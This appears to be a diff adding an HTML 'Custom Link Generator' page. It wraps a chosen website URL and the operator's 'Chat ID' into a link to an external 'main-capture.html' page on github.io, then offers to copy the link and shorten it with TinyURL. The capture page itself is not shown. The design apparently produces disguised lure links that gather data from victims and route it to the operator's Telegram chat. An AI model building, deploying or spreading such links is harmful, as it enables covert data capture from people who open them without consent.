@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link Generator</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f8ff;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: #4CAF50;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        form {
+            margin-bottom: 20px;
+            animation: slideIn 2s ease-out;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            font-size: 1rem;
+            margin-bottom: 10px;
+            width: 80%;
+            max-width: 400px;
+            border: 2px solid #4CAF50;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 1.1rem;
+            color: white;
+            background-color: #4CAF50;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #result, #copyButton, #shortButton {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        #copyButton, #shortButton {
+            display: none;
+            margin-top: 10px;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #copyButton {
+            background-color: #008CBA;
+            color: white;
+        }
+
+        #copyButton:hover {
+            background-color: #007B9A;
+        }
+
+        #shortButton {
+            background-color: #f44336;
+            color: white;
+        }
+
+        #shortButton:hover {
+            background-color: #d7352a;
+        }
+
+        footer {
+            margin-top: 40px;
+            font-size: 1rem;
+            color: #888;
+            animation: fadeIn 3s ease-in-out;
+        }
+
+        footer a {
+            color: #4CAF50;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            0% { transform: translateY(-20px); opacity: 0; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+    <h1>Custom Link Generator</h1>
+    <form id="linkForm">
+        <label for="iframeURL">Website URL:</label>
+        <input type="text" id="iframeURL" name="iframeURL" required><br><br>
+
+        <label for="secondChatId">Your Chat ID:</label>
+        <input type="text" id="secondChatId" name="secondChatId" required><br><br>
+
+        <button type="button" onclick="generateLink()">Generate Link</button>
+    </form>
+
+    <div id="resultSection" style="display: none;">
+        <p id="result"></p>
+        <button id="copyButton" onclick="copyToClipboard()">Copy Link</button>
+        <button id="shortButton" onclick="goToTinyUrl()">Shorten with TinyURL</button>
+    </div>
+
+    <footer>
+        Developed by হাসান. Join us on <a href="https://t.me/yourtelegramlink" target="_blank">Telegram</a>!
+    </footer>
+
+    <script>
+        function generateLink() {
+            const iframeURL = document.getElementById('iframeURL').value;
+            const secondChatId = document.getElementById('secondChatId').value;
+
+            const baseUrl = 'https://yttrium022.github.io/New/main-capture.html'; // Replace with your page URL
+            const generatedLink = `${baseUrl}?URL=${encodeURIComponent(iframeURL)}&ChatId=${encodeURIComponent(secondChatId)}`;
+
+            document.getElementById('result').innerHTML = `<strong>Generated Link:</strong> <a href="${generatedLink}" target="_blank">${generatedLink}</a>`;
+
+            // Hide the form and show the result section
+            document.getElementById('linkForm').style.display = 'none';
+            document.getElementById('resultSection').style.display = 'block';
+            document.getElementById('copyButton').style.display = 'inline-block';
+            document.getElementById('shortButton').style.display = 'inline-block';
+        }
+
+        function copyToClipboard() {
+            const generatedLink = document.querySelector('#result a').textContent;
+            navigator.clipboard.writeText(generatedLink)
+                .then(() => {
+                    alert('Link copied to clipboard!');
+                })
+                .catch(err => {
+                    console.error('Error copying text: ', err);
+                });
+        }
+
+        function goToTinyUrl() {
+            window.open('https://tinyurl.com/', '_blank');
+        }
+    </script>
+</body>
+</html>
